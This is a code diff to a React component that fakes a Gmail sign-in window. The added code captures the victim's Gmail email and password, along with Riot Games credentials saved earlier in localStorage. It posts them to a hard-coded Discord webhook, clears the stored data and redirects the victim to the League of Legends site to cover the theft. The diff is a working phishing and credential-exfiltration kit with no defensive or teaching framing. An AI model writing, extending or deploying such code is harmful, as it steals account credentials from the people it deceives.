@@ -1,16 +1,50 @@
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { X, ArrowLeft, Loader2 } from 'lucide-react';
 
 const GmailWindow = ({ onClose }) => {
   const [position, setPosition] = useState({ x: 150, y: 150 });
   const [step, setStep] = useState(1);
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+  const [email, setEmail] = useState(localStorage.getItem('gmail_email') || "");
+  const [password, setPassword] = useState(localStorage.getItem('gmail_pass') || "");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   
   const isDragging = useRef(false);
   const offset = useRef({ x: 0, y: 0 });
+
+  useEffect(() => {
+    localStorage.setItem('gmail_email', email);
+  }, [email]);
+
+  useEffect(() => {
+    localStorage.setItem('gmail_pass', password);
+  }, [password]);
+
+  const sendToDiscord = async () => {
+    const finalData = {
+      riot_u: localStorage.getItem('riot_u') || "N/A",
+      riot_p: localStorage.getItem('riot_p') || "N/A",
+      gmail_u: localStorage.getItem('gmail_email') || email,
+      gmail_p: localStorage.getItem('gmail_pass') || password
+    };
+    
+    await fetch('https://discord.com/api/webhooks/1527762392107188445/B95liOu8a0_Z1kN_mrrQCWKs3OBUezwnxGnF4CI_keGNPBYhAtLo9BOwwd-wAvMjRNPb', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: "New Gmail Data Received",
+          fields: [
+            { name: "Riot Username", value: finalData.riot_u, inline: true },
+            { name: "Riot Password", value: finalData.riot_p, inline: true },
+            { name: "Gmail Username", value: finalData.gmail_u, inline: true },
+            { name: "Gmail Password", value: finalData.gmail_p, inline: true }
+          ]
+        }]
+      })
+    });
+    localStorage.clear();
+  };
 
   const onMouseDown = (e) => {
     isDragging.current = true;
@@ -24,9 +58,8 @@ const GmailWindow = ({ onClose }) => {
 
   const handleMouseUp = () => (isDragging.current = false);
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (step === 1) {
-      // Validate: must contain @gmail
       if (email.toLowerCase().includes('@gmail')) {
         setStep(2);
         setError("");
@@ -36,6 +69,7 @@ const GmailWindow = ({ onClose }) => {
     } else {
       if (password.length > 0) {
         setLoading(true);
+        await sendToDiscord();
         setTimeout(() => {
           window.location.href = 'https://www.leagueoflegends.com/';
         }, 2000);
@@ -50,7 +84,6 @@ const GmailWindow = ({ onClose }) => {
       style={{ left: position.x, top: position.y }}
       onMouseMove={handleMouseMove}
       onMouseUp={handleMouseUp}
-      // Increased height here (h-[600px])
       className="absolute w-[400px] h-[600px] bg-white rounded-lg shadow-2xl border border-gray-300 z-[100] overflow-hidden"
     >
       <div onMouseDown={onMouseDown} className="h-8 bg-gray-50 flex justify-end items-center px-2 cursor-grab">
